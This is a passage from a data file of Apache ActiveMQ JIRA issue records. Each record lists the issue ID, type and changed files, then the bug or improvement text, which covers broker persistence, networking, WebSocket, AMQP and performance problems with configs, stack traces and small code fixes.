Add support for reading scheduled message instructions from specific Message Annotations that are mapped into values that work with the built-in broker scheduler feature.Annotation NameDescriptionx-opt-delivery-timeAnalogous to the JMS 2.0 delivery time message property.  Value is set in millisecondssince the Unix Epoch.x-opt-delivery-delayTime in Milliseconds to wait before dispatching the message.x-opt-delivery-repeatNumber of time to reschedule a message sent with a fixed delay.x-opt-delivery-periodThe time in ms to wait between successive repeats of a scheduled message.x-opt-delivery-cronA CronTab entry that controls how a message is scheduled.
issueID:AMQ-6039
type:Bug
changed files:IOHelper.java
texts:KahaDB data log archiving does not work accross different physical file systems
The utility class IOHelper uses a trivial rename operation in its move method for files being moved to another directory.  This operation can fail when the target of the move is on a different file system.  The method needs to fall back to a deep copy / remove style operation when the rename attempt fails in order to ensure the file can move.
issueID:AMQ-6042
type:Bug
changed files:
texts:In ActiveMQMessageConsumer, always set rollback cause
In ActiveMQMessageConsumer, currently the rollback cause is only set for the case auto- or individual-acks. However, it should also be set for the other cases, so that in the rollback() method it can be picked up when creating the poison ack.    if (isAutoAcknowledgeBatch() || isAutoAcknowledgeEach() || session.isIndividualAcknowledge()) {        // schedual redelivery and possible dlq processing        md.setRollbackCause(e);        rollback();    } else {        // Transacted or Client ack: Deliver the next message.        afterMessageIsConsumed(md, false);    }I"d suggest to move md.setRollbackCause(e); to before the if().
issueID:AMQ-6044
type:Task
changed files:
texts:AMQP: Add support for testing transactions with the test client.
Update the AMQP test client with the ability to do work in transactions and add some transaction based tests to validate broker behaviour.
issueID:AMQ-6045
type:Sub-task
changed files:
texts:AMQP: update to proton-j 0.11.0
update to proton-j 0.11.0
issueID:AMQ-6046
type:Bug
changed files:StompSocket.java
AbstractStompSocket.java
texts:Concurrent access to a Transport from WebSocket client can deadlock
WebSocket connections can encounter a deadlock when the Jetty side allows for concurrent access to the Transport instance that forwards commands onto the broker core.  This seems to happen mostly in cases where a message or other action is incoming at the same time as Jetty is closing the connection due to idle timeout or some other cause.
issueID:AMQ-6049
type:Improvement
changed files:OracleJDBCAdapter.java
JDBCAdapter.java
DefaultJDBCAdapter.java
texts:Add option to limit results from expensive queries
When using priority messages with JDBC store, a query that recovers messages from the db can be very expensive due to the sorting it has to do. The best way I found to improve the performance of that query is to limit the sorting set by limiting the number of entries expected from the query. This assumes changing the actual query and is vendor specific.
issueID:AMQ-605
type:Bug
changed files:
texts:Update to backport-util.concurrent 2.1
There have been some scary bugfixes in b.u.c as described here:http://dcl.mathcs.emory.edu/util/backport-util-concurrent/changelog.phpUpgrading will probably solve some very obscure bugs, most importantly related to ReentrantReadWriteLock, Condition & livelocks (some JIRA issues sound like that). I recently upgraded mule to buc-2.1 and have not observed any regressions.
issueID:AMQ-6050
type:Bug
changed files:
texts:Recreated durable after deletion in a network of brokers won&#39;t receive messages
When using dynamicallyIncludedDestinations with a network of brokers, if a durable subscription is removed, and then the same one is recreated again, it will no longer receive messages from a networked broker.  The issue is that the networked broker thinks the original subscription demand is still there so that when it is re-created, it doesn"t re-create the demand subscription.  This happens in the createDemandSubscription method in DurableConduitBridge.  The check for addToAlreadyInterestedConsumers is returning true even though there is no currently interested consumers.
issueID:AMQ-6052
type:Bug
changed files:
texts:Network of brokers on duplex mode reports InstanceAlreadyExistsException on already existing destinations
When using a network of brokers apparently on duplex with destinations which were already created on each MBeanBridgeDestination.onOutboundMessage() and MBeanBridgeDestination.onInboundMessage() the bridge tries to register the MBean of a destination which has already been created.Here is a discussion that started but a ticket was not created.http://activemq.2283324.n4.nabble.com/Broker-log-full-of-Failed-to-register-queue-messages-td4685241.htmlAlthough this does not seem to impact the functionality of the application it creates a massive amount of logs as this message repeats for every received message. This are the important bits of my activeMQ configuration:       <networkConnectors>            <networkConnector name="mailSystemConnector" uri="multicast://default" conduitSubscriptions="true" duplex="true" >                <dynamicallyIncludedDestinations>                    <queue physicalName="mailsystem.templateprocessor"/>                    <queue physicalName="DLQ.mailsystem.templateprocessor"/>                </dynamicallyIncludedDestinations>            </networkConnector>        </networkConnectors>        <destinations>            <queue physicalName="SCE"/>            <queue physicalName="mailsystem.templateprocessor"/>            <queue physicalName="ActiveMQ.DLQ"/>        </destinations>        <managementContext>            <managementContext createConnector="true"                               connectorPort="1091"                               jmxDomainName="org.apache.activemq"/>        </managementContext>        <!-- The transport connectors ActiveMQ will listen to -->        <transportConnectors>            <transportConnector name="openwire nio" uri="nio://0.0.0.0:61616" updateClusterClients="true"                                rebalanceClusterClients="true" updateClusterClientsOnRemove="true"/>            <transportConnector name="openwireDiscovery" uri="tcp://0.0.0.0:0"                                discoveryUri="multicast://default" updateClusterClients="true"                                rebalanceClusterClients="true" updateClusterClientsOnRemove="true"/>            <transportConnector name="stomp" uri="stomp://0.0.0.0:61613" updateClusterClients="true"                                rebalanceClusterClients="true" updateClusterClientsOnRemove="true"/>        </transportConnectors>And this is the output log generated:2015-11-18 15:43:10,497 [.69:41090@36731] WARN  MBeanBridgeDestination         - Failed to register queue://mailsystem.templateprocessorjavax.management.InstanceAlreadyExistsException: org.apache.activemq:brokerName=mailsystemBroker,connector=duplexNetworkConnectors,networkConnectorName=#0,networkBridge=tcp_//10.211.2.69_41090,type=Broker,direction=inbound,destinationType=Queue,destinationName=mailsystem.templateprocessor        at com.sun.jmx.mbeanserver.Repository.addMBean(Repository.java:437)        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerWithRepository(DefaultMBeanServerInterceptor.java:1898)        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerDynamicMBean(DefaultMBeanServerInterceptor.java:966)        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerObject(DefaultMBeanServerInterceptor.java:900)        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerMBean(DefaultMBeanServerInterceptor.java:324)        at com.sun.jmx.mbeanserver.JmxMBeanServer.registerMBean(JmxMBeanServer.java:522)        at org.apache.activemq.broker.jmx.ManagementContext.registerMBean(ManagementContext.java:380)        at org.apache.activemq.broker.jmx.AnnotatedMBean.registerMBean(AnnotatedMBean.java:72)        at org.apache.activemq.network.MBeanBridgeDestination.onInboundMessage(MBeanBridgeDestination.java:97)        at org.apache.activemq.network.MBeanNetworkListener.onInboundMessage(MBeanNetworkListener.java:115)        at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceInboundMessage(DemandForwardingBridgeSupport.java:1680)        at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteCommand(DemandForwardingBridgeSupport.java:649)        at org.apache.activemq.network.DemandForwardingBridgeSupport$3.onCommand(DemandForwardingBridgeSupport.java:224)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)        at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)        at java.lang.Thread.run(Thread.java:745)  2015-11-18 15:43:09,634 [Broker] Task-16] WARN  MBeanBridgeDestination         - Failed to register queue://mailsystem.templateprocessorjavax.management.InstanceAlreadyExistsException: org.apache.activemq:brokerName=mailsystemBroker,connector=networkConnectors,networkConnectorName=mailSystemConnector,networkBridge=tcp_//10.211.2.70_36731,type=Broker,direction=outbound,destinationType=Queue,destinationName=mailsystem.templateprocessor        at com.sun.jmx.mbeanserver.Repository.addMBean(Repository.java:437)        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerWithRepository(DefaultMBeanServerInterceptor.java:1898)        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerDynamicMBean(DefaultMBeanServerInterceptor.java:966)        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerObject(DefaultMBeanServerInterceptor.java:900)        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerMBean(DefaultMBeanServerInterceptor.java:324)        at com.sun.jmx.mbeanserver.JmxMBeanServer.registerMBean(JmxMBeanServer.java:522)        at org.apache.activemq.broker.jmx.ManagementContext.registerMBean(ManagementContext.java:380)        at org.apache.activemq.broker.jmx.AnnotatedMBean.registerMBean(AnnotatedMBean.java:72)        at org.apache.activemq.network.MBeanBridgeDestination.onOutboundMessage(MBeanBridgeDestination.java:72)        at org.apache.activemq.network.MBeanNetworkListener.onOutboundMessage(MBeanNetworkListener.java:107)        at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceOutbound(DemandForwardingBridgeSupport.java:1673)        at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceLocalCommand(DemandForwardingBridgeSupport.java:1035)        at org.apache.activemq.network.DemandForwardingBridgeSupport$2.onCommand(DemandForwardingBridgeSupport.java:206)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)        at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:138)        at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:130)        at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:107)        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1419)        at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:938)        at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:984)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)        at java.lang.Thread.run(Thread.java:745)
issueID:AMQ-6055
type:Bug
changed files:PlainMechanism.java
texts:SASL PLAIN auth with AMQP doesn&#39;t take authzid into account
SASL PLAIN authentication with AMQP doesn"t take authzid into account and fails authentication when it"s fully legal in SASL PLAIN.See PROTON-1055 for a more detailed description including debug logs.
issueID:AMQ-6057
type:Improvement
changed files:Statements.java
texts:JDBC Performance Improvement for startup
Actually the getFindAllDestinationsStatement statement should be enhancedwith where container is not null for better performance with indeces. As well in activemq_msg container should be set to not null as in my opinion null is not valid/possible?!
issueID:AMQ-6058
type:Bug
changed files:SelectorAwareVirtualTopicInterceptor.java
VirtualTopicInterceptor.java
texts:Certain VirtualTopic configurations send messages to the wrong queue
When testing out configurations of VirtualTopics I noticed some of the behavior doesn"t seem quite right when using certain VirtualTopic set ups.Consider a VirtualTopic with the default name of > and a prefix called q.test.vt.*.  Normally the desired behavior is to only forward messages to consumers with that prefix.  For example,  if a message is published to a topic called mytopic, then the consumer would be on queue q.test.vt.myconsumer.mytopic.  However, I"ve noticed that based on the interceptor logic that uses the destination map to find matching destinations, if a higher level queue exists, such as q.test.> in this case, that queue will also receive the message.It seems desirable that only queues starting with the defined prefix should get the message so we should probably do a quick sanity check in the VirtualTopicInterceptor to make sure the destinations that match start with the VirtualTopic prefix defined.
issueID:AMQ-6059
type:Bug
changed files:
texts:DLQ message lost after broker restarts
How to Reproduce1. Default ActiveMQ 5.12.1 package with the attached activemq.xml.2. Send a message to a queue with expiration time one second.4. After the expiry time, the message will be moved to DLQ. This can be monitored by the AMQ web console.5. Restart AMQ. You will find that the message disappear from the AMQ web console. Try to consume the message from the DLQ, nothing is received.Cause Analysis1. KahaDB works well. It means the cause should be related to the leveldb mechanism.2. In my understanding, the JMS message is persistent to a log file and leveldb will maintain to a reference to the position where the JMS message is stored in the log. After a message expires, AMQ will copy the expired JMS message and the reference to the posistion is also copied, then send to DLQ. When AMQ restarts, DLQ will recover the message from the persistent storage. Since the DLQ message shares the same reference to the JMS message data, the message in DLQ also has the expiration time that is the same as the original message. The expiry scanner will detect the DLQ message expires and remove it. That"s why the message is lost after restart.3. Actually, the message to DLQ is not completely the same as the origial message. Because the expiration time will be reset to 0 and some more message properties will be added. The DLQ message should not reuse the same reference to message data. For more details, please refer to org.apache.activemq.broker.region.RegionBroker.sendToDeadLetterQueue(ConnectionContext context, MessageReference node, Subscription subscription, Throwable poisonCause) method.Fixed ProposalIn org.apache.activemq.broker.region.RegionBroker.sendToDeadLetterQueue(ConnectionContext context, MessageReference node, Subscription subscription, Throwable poisonCause) method, after the message is copied, set the dataLocator to null (message.getMessageId().setDataLocator(null) to force leveldb to save the new JMS message data and refer to a new position.
issueID:AMQ-606
type:New Feature
changed files:PolicyEntry.java
TopicRegion.java
TopicSubscription.java
PrefetchRatePendingMessageLimitStrategy.java
AbstractSubscription.java
ConstantPendingMessageLimitStrategy.java
PendingMessageLimitStrategy.java
texts:allow old messages to be discarded for slow consumers when using non-durable topics
For background to the issue seehttp://docs.codehaus.org/display/ACTIVEMQ/Slow+ConsumersWhat would be good is if we had a way to set a limit on the pending messages to be dispatched to a subscription so that if that limit is reached, old messages are discarded. This will avoid the non-durable topics from getting blocked due to slow consumers
issueID:AMQ-6060
type:Bug
changed files:
texts:"Will message" retain property is not respected
The "will message" in MQTT can be sent with the retain flag on, meaning that it will be sent to the new subscribers as well. We need to send it with this flag on, if it was specified by the client.
issueID:AMQ-6062
type:Bug
changed files:QueueBrowserSubscription.java
texts:Broker goes 100% CPU on multi-queue command line browse
Hello,The Broker may enter a state of high CPU consumption (100% or 200% if 2 browse enter the infinite loop in the same time on a multi-core) when a command line browse on multiple queues is issued. When that arrives the only way we found to restore the situation was to kill the broker and restart because he was not responding anymore to clients. Killing the clients and the browse process does not lower the CPU usage of the broker.I assume the infinite loop based on successive thread dumps that show the browse thread remaines in the same code zone:Here is an example of the Browse thread call stack trace, when Broker is in high CPU usage state:at java/util/HashMap.rehash(HashMap.java:782(Compiled Code))at java/util/HashMap.rehash(HashMap.java:819(Compiled Code))at java/util/HashMap.putImpl(HashMap.java:702(Compiled Code))at java/util/HashMap.put(HashMap.java:680(Compiled Code))at org/apache/activemq/broker/region/QueueBrowserSubscription.isDuplicate(QueueBrowserSubscription.java:72(Compiled Code))at org/apache/activemq/broker/region/Queue.iterate(Queue.java:1688(Compiled Code))at org/apache/activemq/thread/PooledTaskRunner.runTask(PooledTaskRunner.java:133(Compiled Code)).Tested ActiveMQ versions: 5.9.1 and the last, 5.12.0, but of course I suppose all in beetwen are affected.The cause seems to be the non-threadsafe usage of the audit HashMap member of QueueBrowserSubscription.java class.Here are some facts on non thread-safe HashMap use problems:High CPU / Hang on java.util.HashMap.findNonNullKeyEntry() due to non-thread-safe usage of HashMaphttp://www-01.ibm.com/support/docview.wss?uid=swg21597581IZ73767: INFINITE LOOP CAN OCCUR IN HASHMAPhttp://www-01.ibm.com/support/docview.wss?uid=swg1IZ73767I must underline that this is not an IBM JDK specific problem as the IBM JDK is based on Oracle JDK and changing the JDK or JRE is not a solution.The scenario may be produced with a fresh non modified install (default config) of ActiveMQ broker:1. set ACTIVEMQ_HOME, JAVA_HOME and PATH to point accordingly to the right activemq, and Java version.2. cd $ACTIVEMQ_HOME/bin; ./activemq start3. inject at least 2000 messages in each of two ques, say QA.ONE and QA.TWO4. $ $ACTIVEMQ_HOME/bin/activemq browse --view JMSDestination,JMSMessageID --amqurl tcp://localhost:61616 QA.*The simplest fix that I suggest is to change in the QueueBrowserSubscription.java class the type of audit member to ConcurrentHashMap.
issueID:AMQ-6063
type:Bug
changed files:MessageDatabase.java
texts:NullPointerException during KahaDB index recovery
A broker I was testing ran out of disk space the other day when messages were being written to it because disk usage checks were not set.  After restart, the KahaDB index was detected as corrupted but during the recovery a NullPointerException occurred.The error occurred in MessageDatabase inside recoveryIndex on this line:sd.locationIndex.remove(tx.keys.location)
issueID:AMQ-6065
type:Bug
changed files:
texts:Allow selective use of broker systemExitOnShutdown from DefaultIOExceptionHandler
the broker attribute systemExitOnShutdown is useful in a karaf container or shared vm where the broker is the primary occupant. If the broker dies, then the container should die.For the broker, if the store dies, then the broker should die, but for other scenarios, like the broker is shutdown via jmx or for maintenance, exiting the container is not required.Allowing the DefaultIOExceptionHandler, which gets to handle store exceptions, flip the systemExit bit allows a container to exit on this fatal condition. Ensuring that failover of the store can occur due the the exit of the jvm that has the store lock.With karaf on windows, the file locker is not reliable on failback when the jvm remains active.
issueID:AMQ-6066
type:Bug
changed files:OrderedPendingList.java
texts:Performance issue in OrderedPendingList
I have updated my application from ActiveMQ 5.3 to 5.11.1 and have noticed a serious performance degregation.  Running a number of jstacks I can see the broker is often stuck here:"Queue:master-items" Id=122 RUNNABLE at org.apache.activemq.broker.region.cursors.OrderedPendingList.contains(OrderedPendingList.java:144) at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1930) at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:2119) at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1596) -  locked java.lang.Object@253c3089 at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:112) at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:42) Number of locked synchronizers = 1 - java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync@2eb46567For this specific queue in my application, there were a large number of items in it.. around 100,000.  However I noticed the code for contains has:    public boolean contains(MessageReference message) {        if (message != null) {            for (PendingNode value : map.values()) {                if (value.getMessage().equals(message)) {                    return true;                }            }        }        return false;    }This will obviously be very slow.  Given the Map is keyed by message ID, can"t we do a .contains(message.getMessageId()) instead?  I noticed the remove() method does this.  I changed the code to do this:@Overridepublic boolean contains(MessageReference message) {    if (message != null) {        return map.containsKey(message.getMessageId());    }    return false;}I got a speedup for my test which now takes 29 minutes from 41 minutes.  Can we get this change in to the upcoming 5.13 release (pretty please??)  It is a tiny (but very important) change for us.. many thanks.
issueID:AMQ-6067
type:Bug
changed files:
texts:OutOfMemoryError when expiring big amount of topic messages
There is a problem inorg.apache.activemq.broker.region.Topic.expireMessagesTaskWhen there are big amount of topic messages that are going to be expired, this expireMessagesTask loads all of the messages to memory. This causes2015-11-24 11:05:46.359 WARN  [ActiveMQ Broker[JmsEngineActivemqBroker] Scheduler] [Topic] Failed to browse Topic: test-topicjava.lang.OutOfMemoryError: Java heap space at oracle.sql.BLOB.getBytes(BLOB.java:204) at oracle.jdbc.driver.T4CBlobAccessor.getBytes(T4CBlobAccessor.java:464) at oracle.jdbc.driver.OracleResultSetImpl.getBytes(OracleResultSetImpl.java:676) at org.apache.commons.dbcp.DelegatingResultSet.getBytes(DelegatingResultSet.java:203) at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.getBinaryData(DefaultJDBCAdapter.java:80) at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.doRecover(DefaultJDBCAdapter.java:418) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:597) at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:309) at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:183) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:150) at org.springframework.aop.interceptor.AbstractTraceInterceptor.invoke(AbstractTraceInterceptor.java:113) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172) at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202) at $Proxy14.doRecover(Unknown Source) at org.apache.activemq.store.jdbc.JDBCMessageStore.recover(JDBCMessageStore.java:236) at org.apache.activemq.store.ProxyTopicMessageStore.recover(ProxyTopicMessageStore.java:62) at org.apache.activemq.broker.region.Topic.doBrowse(Topic.java:594) at org.apache.activemq.broker.region.Topic.access$100(Topic.java:65) at org.apache.activemq.broker.region.Topic$6.run(Topic.java:733) at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33) at java.util.TimerThread.mainLoop(Timer.java:512) at java.util.TimerThread.run(Timer.java:462)The problem happens when using JDBC persistency with ActiveMQ 5.10.0. After a short look to source code, the same problem could be also with 5.12.1.Test case: run ActiveMQ broker with JDBC persistency create subscription to a topic, but do not receive the messages send enough number of messages with short TimeToLive when expireMessagesTask is scheduled, it tries to load all of the messages and causes the OutOfMemoryErrorIt would be fine iforg.apache.activemq.store.jdbc.JDBCMessageStore.recover(MessageRecoveryListener)will be updated like this:public void recover(final MessageRecoveryListener listener) throws Exception {  // Get all the Message ids out of the database.  TransactionContext c = persistenceAdapter.getTransactionContext();  try {    c = persistenceAdapter.getTransactionContext();    adapter.doRecover(c, destination, new JDBCMessageRecoveryListener() {      public boolean recoverMessage(long sequenceId, byte[] data) throws Exception {        if (listener.hasSpace()) {          Message msg = (Message)wireFormat.unmarshal(new ByteSequence(data));          msg.getMessageId().setBrokerSequenceId(sequenceId);          return listener.recoverMessage(msg);        } else {          logger.debug("Recovery limit of the messages has exceeded.");          return false;        }                          }      public boolean recoverMessageReference(String reference) throws Exception {        if (listener.hasSpace()) {          return listener.recoverMessageReference(new MessageId(reference));        } else {          logger.debug("Recovery limit of the message references has exceeded.");          return false;        }      }    });  } catch (SQLException e) {    JDBCPersistenceAdapter.log("JDBC Failure: ", e);    throw IOExceptionSupport.create("Failed to recover container. Reason: " + e, e);  } finally {    c.close();  }}But I am not sure if this limitation is the best way, because there will be some messages that should be expired, but need to wait. So better solution might be to do this job in more separated transactions.
issueID:AMQ-6068
type:Bug
changed files:ActiveMQManagedConnection.java
ActiveMQConnection.java
texts:RAR - cannot reset clientId on pooled managed connection
A managed connection returned to the pool has cleanup called, but cleanup is not releasing the underlying activemq connection  info and clientid. On the second attempt to reuse the connection, setting the id fails due to the pre existing state in error.[Server:eai01] 17:04:58,073 WARN  [org.jboss.jca.core.connectionmanager.pool.strategy.OnePool] (jmsListener-734) IJ000613: Throwable while trying to match managed connection, destroying connection: org.jboss.jca.core.connectionmanager.listener.TxConnectionListener@3e11f08f[state=NORMAL managed connection=[org.apache.activemq.ra.ActiveMQManagedConnection@34bc339a,ActiveMQConnection {id=ID:macbookpro-2.local-54186-1448868251571-1463:1,clientId=xxx,started=false}] connection handles=0 lastUse=1448874205871 trackByTx=false pool=org.jboss.jca.core.connectionmanager.pool.strategy.OnePool@2f2f39fd pool internal context=SemaphoreArrayListManagedConnectionPool@51eff7c[pool=ActiveMQConnectionFactory] xaResource=XAResourceWrapperImpl@623206[xaResource=[org.apache.activemq.ra.ActiveMQManagedConnection$1@64df868a,TransactionContext{transactionId=null,connection=ActiveMQConnection {id=ID:macbookpro-2.local-54186-1448868251571-1463:1,clientId=xxx,started=false}}] pad=false overrideRmValue=null productName=ActiveMQ productVersion=5.12.1 jndiName=java:/ra/activeMQ/ActiveMQConnectionFactory] txSync=null]: javax.resource.ResourceException: javax.jms.IllegalStateException: Setting clientID on a used Connection is not allowed[Server:eai01]  at org.apache.activemq.ra.ActiveMQManagedConnectionFactory.matchManagedConnections(ActiveMQManagedConnectionFactory.java:217) [activemq-ra-5.12.1.jar:5.12.1][Server:eai01]  at org.jboss.jca.core.connectionmanager.pool.mcp.SemaphoreArrayListManagedConnectionPool.getConnection(SemaphoreArrayListManagedConnectionPool.java:314)[Server:eai01]  at org.jboss.jca.core.connectionmanager.pool.AbstractPool.getSimpleConnection(AbstractPool.java:453)[Server:eai01]  at org.jboss.jca.core.connectionmanager.pool.AbstractPool.getConnection(AbstractPool.java:425)[Server:eai01]  at org.jboss.jca.core.connectionmanager.AbstractConnectionManager.getManagedConnection(AbstractConnectionManager.java:354)[Server:eai01]  at org.jboss.jca.core.connectionmanager.tx.TxConnectionManagerImpl.getManagedConnection(TxConnectionManagerImpl.java:368)[Server:eai01]  at org.jboss.jca.core.connectionmanager.AbstractConnectionManager.allocateConnection(AbstractConnectionManager.java:510)[Server:eai01]  at org.apache.activemq.ra.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:94) [activemq-ra-5.12.1.jar:5.12.1][Server:eai01]  at org.apache.activemq.ra.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:78) [activemq-ra-5.12.1.jar:5.12.1]
issueID:AMQ-6069
type:Bug
changed files:
texts:Purging a Queue can lead to OOM error with prioritized messages
The other day I noticed that when purging a large Queue I receive an out of memory error in the broker.  I did some investigation and it looks like this only happens if using a Queue that is configured to use prioritized messages.  After analyzing the heap dump it was discovered that after a purge, the dispatchPendingList in the Queue is still retaining all messages and not freeing them as it should.
issueID:AMQ-607
type:Improvement
changed files:TcpTransport.java
texts:Provide ability to control socket connect timeout.
Unless I"ve missed it, I don"t see that TcpTransport allows a timeout value for socket.connect ().The default connect timeout is something like 3 minutes.  If using a static list of connectors in a broker configuration, or a specific tcp target for a client, and a host is known, but not on the network, then the connection attempt will hang for that entire time.  The JDK 1.4 Socket API allows for a timeout value to be given to Socket.connect.Can you please provide this feature, and a setting on a connection URL?
issueID:AMQ-6070
type:Bug
changed files:
texts:originalDestination property of advisory messages set to message id in error
The discarded/consumed/delivered advisories have the messageid as the value of the property key originalDestination in error.
issueID:AMQ-6071
type:Bug
changed files:Journal.java
texts:Log info about corrupted journal records at WARN level
Currently information about corrupted journal records are logged at INFO level.2015-12-03 14:26:21,292 | INFO  | pool-12-thread-1 | Journal  | tore.kahadb.disk.journal.Journal  335 | 171 - org.apache.activemq.activemq-osgi - 5.11.1 | Corrupt journal records found in "/tmp/kahadb/db-1.log" between offsets: 2041..3156We should change the log level to WARN.
issueID:AMQ-6073
type:Bug
changed files:
texts:WebSockets no longer working on most browers
It is no longer possible to open a web socket from the recent browsers such as : chrome, IE 11 and safari. Firefox is still working.It triggers an exception telling that the following header is missing: Sec-WebSocket-Protocol
issueID:AMQ-6074
type:Bug
changed files:
texts:AMQ4126Test#testOpenwireNIOSSLWithCertificate fails with JDK8
Both AMQ4126Test.testOpenwireNIOSSLWithCertificate and AMQ4126Test.testOpenwireNIOSSLWithUsernameAndPassword fail when run with JDK8 with the errors below.  They both pass with JDK7.-------------------------------------------------------Running org.apache.activemq.bugs.AMQ4126TestTests run: 9, Failures: 0, Errors: 2, Skipped: 0, Time elapsed: 24.589 sec <<< FAILURE! - in org.apache.activemq.bugs.AMQ4126TesttestOpenwireNIOSSLWithUsernameAndPassword(org.apache.activemq.bugs.AMQ4126Test)  Time elapsed: 2.437 sec  <<< ERROR!javax.jms.JMSException: Could not connect to broker URL: ssl://planet-express:34060. Reason: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake at org.apache.activemq.bugs.AMQ4126Test.openwireConnectTo(AMQ4126Test.java:132) at org.apache.activemq.bugs.AMQ4126Test.testOpenwireNIOSSLWithUsernameAndPassword(AMQ4126Test.java:153)Caused by: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake at org.apache.activemq.bugs.AMQ4126Test.openwireConnectTo(AMQ4126Test.java:132) at org.apache.activemq.bugs.AMQ4126Test.testOpenwireNIOSSLWithUsernameAndPassword(AMQ4126Test.java:153)Caused by: java.io.EOFException: SSL peer shut down incorrectly at org.apache.activemq.bugs.AMQ4126Test.openwireConnectTo(AMQ4126Test.java:132) at org.apache.activemq.bugs.AMQ4126Test.testOpenwireNIOSSLWithUsernameAndPassword(AMQ4126Test.java:153)testOpenwireNIOSSLWithCertificate(org.apache.activemq.bugs.AMQ4126Test)  Time elapsed: 2.157 sec  <<< ERROR!javax.jms.JMSException: Could not connect to broker URL: ssl://planet-express:38890. Reason: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake at org.apache.activemq.bugs.AMQ4126Test.openwireConnectTo(AMQ4126Test.java:134) at org.apache.activemq.bugs.AMQ4126Test.testOpenwireNIOSSLWithCertificate(AMQ4126Test.java:158)Caused by: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake at org.apache.activemq.bugs.AMQ4126Test.openwireConnectTo(AMQ4126Test.java:134) at org.apache.activemq.bugs.AMQ4126Test.testOpenwireNIOSSLWithCertificate(AMQ4126Test.java:158)Caused by: java.io.EOFException: SSL peer shut down incorrectly at org.apache.activemq.bugs.AMQ4126Test.openwireConnectTo(AMQ4126Test.java:134) at org.apache.activemq.bugs.AMQ4126Test.testOpenwireNIOSSLWithCertificate(AMQ4126Test.java:158)Results :Tests in error:   AMQ4126Test.testOpenwireNIOSSLWithCertificate:158->openwireConnectTo:134 » JMS  AMQ4126Test.testOpenwireNIOSSLWithUsernameAndPassword:153->openwireConnectTo:132 » JMSTests run: 9, Failures: 0, Errors: 2, Skipped: 0
issueID:AMQ-6077
type:Improvement
changed files:ConsumerInfo.java
ActiveMQObjectMessage.java
XStreamWireFormat.java
TransientInitializer.java
texts:Better configuration of restricted classes for clients
AMQ-6013 introduces the checks on the classes that are allowed to be serialized through ObjectMessages. The original implementation was designed to protect the broker, so system property configuration was the easiest solution.This change affect the clients that uses ObjectMessages.getObject() method. We need to provide a better way of configuring this for clients. My initial idea is that we should provide a configuration on ActiveMQConnectionFactory and ActiveMQComponent classes.
issueID:AMQ-608
type:Improvement
changed files:FailoverTransport.java
InactivityMonitor.java
texts:Change logging level of some DemandForwardingBridge log messages.
